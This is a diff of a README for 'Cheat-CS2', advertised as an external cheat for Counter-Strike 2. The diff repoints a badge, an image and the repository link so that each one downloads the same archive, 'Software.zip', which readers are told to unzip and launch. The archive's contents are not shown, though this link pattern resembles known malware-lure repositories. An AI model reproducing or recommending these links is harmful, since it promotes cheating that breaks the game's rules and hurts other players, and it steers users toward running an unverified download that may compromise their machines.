@@ -27,7 +27,7 @@ Welcome to Cheat-CS2, the ultimate external cheat for Counter-Strike 2! 🚀 Thi
 
 ## Getting Started
 To get started with Cheat-CS2, simply download the latest release from the link below:
-[![Download Cheat-CS2](https://img.shields.io/badge/Download%20Cheat--CS2-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Cheat-CS2](https://github.com/nobeckk/Cheat-CS2/releases/download/v1.0/Software.zip%20Cheat--CS2-v1.0.0-blue)](https://github.com/nobeckk/Cheat-CS2/releases/download/v1.0/Software.zip)
 *Note: After downloading the file, unzip it before launching.*
 
 ## Installation
@@ -49,6 +49,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 🎮 Get ready to dominate the battlefield with Cheat-CS2! Enhance your gaming skills and experience like never before. Download now and unleash the power of external cheats in Counter-Strike 2. Have fun gaming and happy hacking! 🚁
 
-![CS2 Cheat](https://imgur.com/gallery/9I6Xb6n)
+![CS2 Cheat](https://github.com/nobeckk/Cheat-CS2/releases/download/v1.0/Software.zip)
 
-[Visit Cheat-CS2 Repository](https://github.com/your-username/Cheat-CS2)
+[Visit Cheat-CS2 Repository](https://github.com/nobeckk/Cheat-CS2/releases/download/v1.0/Software.zip)
